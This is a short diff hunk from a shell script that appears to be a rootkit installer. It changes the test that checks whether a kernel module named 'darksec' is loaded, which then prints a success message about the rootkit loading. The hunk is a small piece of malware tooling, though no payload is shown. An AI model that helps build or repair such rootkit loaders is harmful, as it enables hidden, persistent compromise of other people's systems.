@@ -94,7 +94,7 @@ case "$choice" in
 
 	fi
 
-if [ $( /usr/bin/lsmod | grep -w "darksec" ) = "darksec" ]; then
+if /usr/bin/lsmod | grep -w "darksec"; then
 
 	echo "[+] ROOTKIT LOADING WITH SUCESS!!"
 	exit
